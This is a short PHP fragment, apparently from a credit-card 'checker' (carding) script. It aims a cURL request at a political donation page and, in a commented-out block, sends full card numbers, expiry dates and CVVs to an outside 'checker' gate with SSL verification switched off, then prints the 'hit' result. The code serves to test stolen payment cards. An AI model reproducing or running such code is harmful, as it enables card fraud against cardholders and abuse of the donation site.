...
###################################[cs_live take]#####################
    $ch = curl_init();
          curl_setopt($ch, CURLOPT_URL, 'https://act.stoptrump.org.uk/donate/1');
...
//   $ch = curl_init();
//           curl_setopt($ch, CURLOPT_URL, 'https://shadow-demon-checker.sahilyadav5.repl.co/gate/usd1cvv.php?lista='.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'|'.$cc_code.'&sec=&cst=');
//           curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
//           curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
//           curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
//           curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
//           $hitting = curl_exec($ch);
//            echo $hitting;
// }
